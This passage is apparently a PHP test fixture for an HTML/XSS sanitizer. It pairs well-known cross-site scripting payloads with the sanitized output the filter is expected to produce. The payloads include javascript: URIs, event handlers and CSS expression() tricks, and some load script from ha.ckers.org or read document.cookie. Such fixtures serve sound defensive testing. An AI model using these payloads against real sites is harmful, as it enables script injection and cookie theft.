            '<math href="javascript:alert(1)">CLICKME</math>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           => '&lt;math href="(1)"&gt;CLICKME&lt;/math&gt;',
            '<math> <!-- up to FF 13 --> <maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>  <!-- FF 14+ --> <maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction> </math>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     => '&lt;math&gt; &lt;!-- up to FF 13 --&gt; <maction actiontype="statusline#http://google.com" >CLICKME</maction>  &lt;!-- FF 14+ --&gt; <maction actiontype="statusline" >CLICKME<mtext>http://http://google.com</mtext></maction> &lt;/math&gt;',
            '<​img[a][b]src=x[d]onerror[c]=[e]"alert(1)">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              => '< img[a][b]src=x[d][c]=[e]"alert&#40;1&#41;">',
            '<a href="[a]java[b]script[c]:alert(1)">XXX</a>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            => '<a href="">XXX</a>',
            '<form action="" method="post"> <input name="username" value="admin" /> <input name="password" type="password" value="secret" /> <input name="injected" value="injected" dirname="password" /> <input type="submit"> </form>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => '&lt;form action="" method="post"&gt; &lt;input name="username" value="admin" /&gt; &lt;input name="password" type="password" value="secret" /&gt; &lt;input name="injected" value="injected" dirname="password" /&gt; &lt;input type="submit"&gt; &lt;/form&gt;',
            '<link rel="import" href="test.svg" />'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     => '&lt;link rel="import" href="test.svg" /&gt;',
            '<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          => '&lt;iframe srcdoc="<img >" />',
            '<picture><source srcset="x"><img onerror="alert(1)"></picture>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            => '<picture>&lt;source srcset="x"&gt;<img ></picture>',
            '<picture><img srcset="x" onerror="alert(1)"></picture>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    => '<picture><img srcset="x" ></picture>',
            '<img srcset=",,,,,x" onerror="alert(1)">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => '<img srcset=",,,,,x" >',
            '<table background="javascript:alert(1)"></table>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          => '<table background="(1)"></table>',
            '<comment><img src="</comment><img src=x onerror=alert(1)//">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              => '<comment><img >&lt;img ">',
            '<![><img src="]><img src=x onerror=alert(1)//">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           => '<![><img >&lt;img ">', // up to Opera 11.52, FF 3.6.28
            '<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             => '&lt;svg&gt;&lt;![CDATA[><image >&lt;/svg&gt;', // IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+
            '<img src onerror /" \'"= alt=alert(1)//">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 => '<img >',
            '?x=<img+src=x+onerror=`ö`-alert(1)>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       => '?x=<img+>', // Chrome 2016/07
            '<audio src=data:;base64,//MUxHNtYWxsZXN0LW1wMy1ieS1AcWFi//MUxCc+Ij4vPlw+PHN2Zy9vbmxvYWQ9//MUxGFsZXJ0KCdAcWFiJyk7cWFiYW5k//MUxA oncanplay=XSS'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              => '&lt;audio ',
            '<meta http-equiv=x-ua-compatible content=ie=8>1<comment onresize=alert(1) contenteditable>1'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => '&lt;meta http-equiv=x-ua-compatible content=ie=8&gt;1<comment  contenteditable>1', // IE11
            '<?xml version="1.0" encoding="utf-8" ?><x:script
xmlns:x="http://www.w3.org/1999/xhtml ">alert(1&#00000041;' => '&lt;?xml version="1.0" encoding="utf-8" ?&gt;<x:script
xmlns:x="http://www.w3.org/1999/xhtml ">alert(1&#00000041;', // IE11
            '<%/%=%&#62<&#112/&#111&#110&#114&#101&#115&#105&#122&#101=&#97&#108&#101&#114&#116(1)//>'                                                                                                                                  => '&lt;%/%=%&gt;&lt;p/&gt;',
            '<style><img src="</style><img src=x onerror=alert(1)//">'                                                                                                                                                                  => '&lt;style&gt;<img src="">',
            '<head><base href="javascript://"/></head><body><a href="/. /,alert(1)//#">XXX</a></body>'                                                                                                                                  => '&lt;head&gt;&lt;base href="//"/&gt;&lt;/head&gt;&lt;body&gt;<a href="">XXX</a>&lt;/body&gt;',
            '<SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT>'                                                                                                                                                           => 'alert&#40;1&#41;',
            '<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>'                                                                                                  => '&lt;OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"&gt;<PARAM NAME="DataURL" VALUE="(1)">&lt;/OBJECT&gt;',
            '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>'                                                                                                                                       => '&lt;object data="PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;&lt;/object&gt;',
            '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>'                                                                                                                                          => '&lt;embed src="PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;&lt;/embed&gt;',
            '<b <script>alert(1)//</script>0</script></b>'                                                                                                                                                                              => '<b 0&lt;/b>',
            '<// style=x:expression\28write(1)\29>'                                                                                                                                                                                     => '&lt;// &gt;', // IE7
            '<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(write(1))}</style>'                                                                                                                                                                                  => '&lt;style&gt;*{x:ｅｘｐｒｅｓｓｉｏｎ(write(1))}&lt;/style&gt;', // IE6
            '<div style="background:url(test5.svg)">PRESS ENTER</div>'                                                                                                                                                                  => '<div >PRESS ENTER</div>', // Up to Opera 12.x
            '<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>'                                                                                                                                                  => '&lt;?xml-stylesheet type="text/css"?&gt;<root />', // IE7
            '<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>'                                                                                                                                            => '&lt;?xml-stylesheet type="text/css" href="data:,*{x:write(2));}"?&gt;', // IE8 -> IE10
            '<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/>'                                                                                                                    => '<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="(1)//#x"/>',
            '<iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>'                                                                                                                         => '&lt;iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"&gt;&lt;/iframe&gt;',
            '<!-- `<img/src=xx:xx onerror=alert(1)//--!>'                                                                                                                                                                               => '&lt;!-- `<img/>',
            '<title onpropertychange=alert(1)></title><title title=></title>'                                                                                                                                                           => '&lt;title &gt;&lt;/title&gt;&lt;title title=&gt;&lt;/title&gt;',
            '<​iframe src="data:text/html,&lt;iframe src=\'data:text/html,%26lt;iframe onload=alert(1)&gt;\'&gt;"></iframe>'                                                                                                            => '&lt; iframe src="data:text/html,&lt;iframe src=\'data:text/html,&lt;iframe &gt;\'&gt;">&lt;/iframe&gt;',
            '<!--<img src="--><​img src=x onerror=alert(1)//">'                                                                                                                                                                         => '&lt;!--<img >&>',
            '<​frameset onload=alert(1)>'                                                                                                                                                                                               => '&lt; frameset &gt;',
            '<​body oninput=alert(1)><​input autofocus>'                                                                                                                                                                                => '&lt; body &gt;&lt; input autofocus&gt;',
            '<​video poster=javascript:alert(1)//></video>'                                                                                                                                                                             => '&lt; video poster=(1)//&gt;&lt;/video&gt;',
            '<a style="-o-link:\'javascript:alert(1)\';-o-link-source:current">X</a>'                                                                                                                                                   => '<a >X</a>',
            '<a href="applescript://com.apple.scripteditor?action=new&script=display%20dialog%20%22Hello%2C%20World%21%22">applescript</a>'                                                                                             => '<a href="//com.apple.scripteditor?action=new&script=display dialog ">applescript</a>',
            '<a onmouseoveronmouseover="alert(document.cookie)"onmouseover="alert(document.cookie)">xxs</a>'                                                                                                                            => '<a >xxs</a>',
            '<a onmouseover="alert(document.cookie)">xxs</a>'                                                                                                                                                                           => '<a >xxs</a>',
            '<a onmouseover=alert(document.cookie)>xxs</a>'                                                                                                                                                                             => '<a >xxs</a>',
            '<a onerror="alert(document.cookie)">xxs</a>'                                                                                                                                                                               => '<a >xxs</a>',
            '<a onerror=`alert(document.cookie)`>xxs</a>'                                                                                                                                                                               => '<a >xxs</a>',
            '<a href=http://foo.bar STYLE=xss:expression(alert("XSS"))>xxs style</a>'                                                                                                                                                   => '<a >xxs style</a>',
            '<SCRIPT>alert(\'XSS\');</SCRIPT>'                                                                                                                                                                                          => '',
            '\'\';!--"<XSS onclick="alert">=&{()}'                                                                                                                                                                                      => '\'\';!--"<XSS >=&{()}',
            '<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'                                                                                                                                                                          => '',
            '<IMG SRC="javascript:alert(\'XSS\');">'                                                                                                                                                                                    => '<IMG SRC="(\'XSS\');">',
            '<IMG SRC=javascript:alert(\'XSS\')>'                                                                                                                                                                                       => '<IMG >',
            '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>'                                                                                                                                                                                       => '<IMG >',
            '<IMG SRC=javascript:alert(&quot;XSS&quot;)>'                                                                                                                                                                               => '<IMG >',
            '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>'                                                                                                                                                                      => '<IMG >',
            '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>'                                                                                                                                                                 => '<IMG >',
            'SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>'                                                                                  => 'SRC=&#10<IMG 6;avascript:alert&#40;\'XSS\'&#41;>',
            '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>' => '<IMG >',
            '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>'                                                                                             => '<IMG >',
            '<IMG SRC="jav	ascript:alert(\'XSS\');">'                                                                                                                                                                                   => '<IMG SRC="(\'XSS\');">',
            '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">'                                                                                                                                                                              => '<IMG SRC="(\'XSS\');">',
            '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">'                                                                                                                                                                              => '<IMG src="">',
            '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">'                                                                                                                                                                            => '<IMG SRC=" &#14;  (\'XSS\');">',
            '<IMG%0aSRC%0a=%0a"%0aj%0aa%0av%0aa%0as%0ac%0ar%0ai%0ap%0at%0a:%0aa%0al%0ae%0ar%0at%0a(%0a\'%0aX%0aS%0aS%0a\'%0a)%0a"%0a>'                                                                                                  => "<IMG\nSRC\n=\n\"\n(\n'\nX\nS\nS\n'\n)\n\"\n>",
            '<IMG SRC=java%00script:alert(\"XSS\")>'                                                                                                                                                                                    => '<IMG >',
            '<SCR%00IPT>alert(\"XSS\")</SCR%00IPT>'                                                                                                                                                                                     => '',
            '<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>'                                                                                                                                                                    => '',
            '<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>'                                                                                                                                                                                => '',
            '<IMG SRC="javascript:alert(\'XSS\')"'                                                                                                                                                                                      => '&lt;IMG SRC="(\'XSS\')"',
            '<SCRIPT>a=/XSS/'                                                                                                                                                                                                           => '',
            '\";alert(\'XSS\');//'                                                                                                                                                                                                      => '\";alert&#40;\'XSS\'&#41;;//',
            '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">'                                                                                                                                                                     => '&lt;INPUT TYPE="IMAGE" SRC="(\'XSS\');"&gt;',
            '<BODY BACKGROUND="javascript:alert(\'XSS\')">'                                                                                                                                                                             => '&lt;BODY BACKGROUND="(\'XSS\')"&gt;',
            '<BODY ONLOAD=alert(\'XSS\')>'                                                                                                                                                                                              => '&lt;BODY &gt;',
            '<IMG DYNSRC="javascript:alert(\'XSS\')">'                                                                                                                                                                                  => '<IMG DYNSRC="(\'XSS\')">',
            '<IMG LOWSRC="javascript:alert(\'XSS\')">'                                                                                                                                                                                  => '<IMG LOWSRC="(\'XSS\')">',
            '<BGSOUND SRC="javascript:alert(\'XSS\');">'                                                                                                                                                                                => '<IMG >',
            '<DIV STYLE="width:' . "\n" . 'expression(alert(\'XSS\'));">'                                                                                                                                                               => '<DIV >',
            '<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>'                                                                                                                                                                  => '&lt;LAYER SRC="http://ha.ckers.org/scriptlet.html"&gt;&lt;/LAYER&gt;',
            '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">'                                                                                                                                                                 => '&lt;LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css"&gt;',
            '<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">'                                                                                                                                                                => '&lt;LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css"&gt;',
            '<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d'                                                                                                                                                             => '&lt;link rel=stylesheet href=data:,*{x:write(1))}',
            '<STYLE>@import\'http://ha.ckers.org/xss.css\';</STYLE>'                                                                                                                                                                    => '&lt;STYLE&gt;@import\'http://ha.ckers.org/xss.css\';&lt;/STYLE&gt;',
            '<style>p[foo=bar{}*{-o-link:\'javascript:alert(1)\'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>'                                                                                              => '&lt;style&gt;p[foo=bar{}*{-o-link:\'(1)\'}{}*{-o-link-source:current}*{background:red}]{background:green};&lt;/style&gt;',
            '<DIV STYLE="width: expression(alert(\'XSS\'));">lall</div>'                                                                                                                                                                => '<DIV >lall</div>',
            '<DIV STYLE=\'width: expression(alert("XSS"));\'>lall</div>'                                                                                                                                                                => '<DIV >lall</div>',
            '<DIV STYLE="width: expression(alert(\'XSS\'));" title="lall" STYLE=\'width: expression(alert("XSS"));\'>lall</div>'                                                                                                        => '<DIV  title="lall" >lall</div>',
            '<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">'                                                                                                                                          => '&lt;META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">',
            '<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>'                                                                                                                                               => '&lt;STYLE&gt;BODY{:url("http://ha.ckers.org/xssmoz.xml#xss")}&lt;/STYLE&gt;',
            '<IMG SRC=\'vbscript:msgbox("XSS")\'>'                                                                                                                                                                                      => '<IMG SRC=\'("XSS")\'>',
            '<IMG SRC="mocha:[code]">'                                                                                                                                                                                                  => '<IMG SRC="">',
            '<IMG SRC="livescript:[code]">'                                                                                                                                                                                             => '<IMG SRC="">',
            '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">'                                                                                                                                                    => '&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;',
            '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">'                                                                                                                => '&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;',
            '<META HTTP-EQUIV="Link" Content="<javascript:alert(\'XSS\')>; REL=stylesheet">'                                                                                                                                            => '&lt;META HTTP-EQUIV="Link" Content="&lt;(\'XSS\')&gt;; REL=stylesheet"&gt;',
            '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">'                                                                                                                                       => '&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=(\'XSS\');"&gt;',
            '<a><a><p></a></p><meta property="the:property" content="No results for;url=hxxp://www.maliciousxss.com" HTTP-EQUIV="refresh" blah=" (Page 1)" />foobar</a>'                                                                => '<a><a><p></a></p>&lt;meta property="the:property" content="No results for;url=hxxp://www.maliciousxss.com" HTTP-EQUIV="refresh" blah=" (Page 1)" /&gt;foobar</a>',
            '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>'                                                                                                                                                                        => '&lt;FRAMESET&gt;&lt;FRAME SRC="(\'XSS\');"&gt;&lt;/FRAMESET&gt;',
            '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>'                                                                                                                                                             => '&lt;FRAMESET&gt;&lt;FRAME SRC="(\'XSS\');"&gt;&lt;/FRAMESET&gt;',
            '<TABLE BACKGROUND="javascript:alert(\'XSS\')">'                                                                                                                                                                            => '<TABLE BACKGROUND="(\'XSS\')">',
            '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">'                                                                                                                                                            => '<DIV >',
            '<DIV STYLE="width: expression(alert(\'XSS\'));">'                                                                                                                                                                          => '<DIV >',
            '<STYLE>@im\port\'\ja\vasc\ript:alert("XSS")\';</STYLE>'                                                                                                                                                                    => '&lt;STYLE&gt;@im\port\'\ja\vasc\ript:alert&#40;"XSS"&#41;\';&lt;/STYLE&gt;',
            '<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">'                                                                                                                                                                       => '<IMG >',
            '<XSS STYLE="xss:expression(alert(\'XSS\'))">'                                                                                                                                                                              => '<XSS >',
            'exp/*<XSS STYLE=\'no\xss:noxss("*//*");>'                                                                                                                                                                                  => 'exp/*<XSS >',
            '<STYLE TYPE="text/javascript">alert(\'XSS\');</STYLE>'                                                                                                                                                                     => '&lt;STYLE TYPE="text/javascript"&gt;alert&#40;\'XSS\'&#41;;&lt;/STYLE&gt;',
            '<STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')");}</STYLE><A CLASS=XSS></A>'                                                                                                                                  => '&lt;STYLE TYPE="text/javascript"&gt;alert&#40;\'XSS\'&#41;;&lt;/STYLE&gt;',
            '<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE>'                                                                                                                                          => '&lt;STYLE type="text/css"&gt;BODY{background:url("(\'XSS\')")}&lt;/STYLE&gt;',
            '<BASE HREF="javascript:alert(\'XSS\');//">'                                                                                                                                                                                => '&lt;BASE HREF="(\'XSS\');//"&gt;',
            '<object allowscriptaccess="always" data="test.swf"></object>'                                                                                                                                                              => '&lt;object allowscriptaccess="always" data="test.swf"&gt;&lt;/object&gt;',
            '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>'                                                                                                                                       => '&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"&gt;&lt;/OBJECT&gt;',
            '<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert(\'XSS\')></OBJECT>'                                                                                                      => '&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;<param name=url value=(\'XSS\')>&lt;/OBJECT&gt;',
            'getURL("javascript:alert(\'XSS\')")'                                                                                                                                                                                       => 'getURL("(\'XSS\')")',
            '<EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:
org/xss.swf" AllowScriptAccess="always"></EMBED>' => '&lt;EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:
org/xss.swf" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;',
            '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>' => '&lt;EMBED SRC="PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;',
            '<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert(\'XSS\');">'                                                                                                                                                                                                                                                                                                                                              => '&lt;!--<value>&lt;![CDATA[&lt;XML ID=I&gt;<X><C>&lt;![CDATA[<IMG src="">',
            '<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>'                                                                                                                                                                                                                                                                                                                                                                                    => '&lt;XML SRC="http://ha.ckers.org/xsstest.xml" ID=I&gt;&lt;/XML&gt;',
            '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(\'XSS\')"></B></I></XML>'                                                                                                                                                                                                                                                                                                                                                           => '&lt;XML ID="xss"&gt;<I><B><IMG src=""></B></I>&lt;/XML&gt;',
            '<HTML><BODY>'                                                                                                                                                                                                                                                                                                                                                                                                                              => '&lt;HTML&gt;&lt;BODY&gt;',
            '<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>'                                                                                                                                                                                                                                                                                                                                                                                       => '',
            '<!--#exec cmd="/bin/echo \'<SCRIPT SRC\'"--><!--#exec cmd="/bin/echo \'=http://ha.ckers.org/xss.js></SCRIPT>\'"-->'                                                                                                                                                                                                                                                                                                                        => '&lt;!--#exec cmd="/bin/echo \'&lt;!--#exec cmd="/bin/echo \'=http://ha.ckers.org/xss.js>\'"--&gt;',
            '<? echo(\'<SCR)\';'                                                                                                                                                                                                                                                                                                                                                                                                                        => '&lt;? echo(\'&lt;SCR)\';',
            '<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert(\'XSS\')&lt;/SCRIPT&gt;">'                                                                                                                                                                                                                                                                                                                                               => '&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID="&gt;',
            '<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(\'XSS\');+ADw-/SCRIPT+AD4-'                                                                                                                                                                                                                                                                                                         => '&lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;', // UTF-7
            '<img src="http://test.de/[0xE0]">
      ... foo ...
      ... bar ...
      " onerror="alert(\'XSS\')"
      <div>lall</div>' => '<img src="http://test.de/[0xE0]">
      ... foo ...
      ... bar ...
      " ="alert&#40;\'XSS\'&#41;"
      <div>lall</div>',
            '<script>+-+-1-+-+alert(1)</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           => '',
            '<body/onload=&lt;!--&gt;&#10alert(1)>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => "&lt;body/\nalert&#40;1&#41;&gt;",
            '<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           => '<a >ClickMe',
            '<--`<img/src=` onerror=alert(1)> --!>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => '&lt;--`&lt;img/&gt; --!&gt;',
            '<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000099;&#x00074;(1)></script> ​'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      => '  ',
            '<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                => '&lt;meta charset="x-imap4-modified-utf7"&gt;&alert&A7&(1)&R&UA;&&&lt;&A9&11/script&X&&gt;',
            '<div id=”3″><meta charset=”x-imap4-modified-utf7″>&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//[“‘`–>]]>]</div>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => '<div id=”3″>&lt;meta charset=”x-imap4-modified-utf7″&gt;&alert&A7&(1)&R&UA;&&&lt;&A9&11/script&X&&gt;//[“‘`–&gt;]]&gt;]&lt;/div&gt;',
            '<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     => '" >',
            '<SCRIPT a=">" \'\' SRC="http://ha.ckers.org/xss.js"></SCRIPT>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                => '" \'\' >',
            '<SCRIPT "a=\'>\'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 => '\'" >',
            '<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     => '` >',
            'onAttribute="bar"'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            => '="bar"',
            "onAttribute=\"<script>alert('bar')</script>\""                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                => '=""',
            "<BGSOUND SRC=\"javascript:alert('XSS');\">"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   => '&lt;BGSOUND SRC="(\'XSS\');"&gt;', // BGSOUND
            "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => "&lt;LINK REL=\"stylesheet\" HREF=\"('XSS');\"&gt;", // STYLE sheet
            '<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</styel>foo'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => '&lt;STYLE&gt;BODY{:url("http://ha.ckers.org/xssmoz.xml#xss")}</styel>foo', // Remote style sheet
            "<STYLE>@im\\port'\\jaasc\ript:alert(\"XSS\")';</STYLE>"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       => "&lt;STYLE&gt;@im\port'\jaasc\nipt:alert&#40;\"XSS\"&#41;';&lt;/STYLE&gt;", // STYLE tags with broken up JavaScript for XSS
            "<XSS STYLE=\"xss:expression_r(alert('XSS'))\">"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => '<XSS >', // Anonymous HTML with STYLE attribute
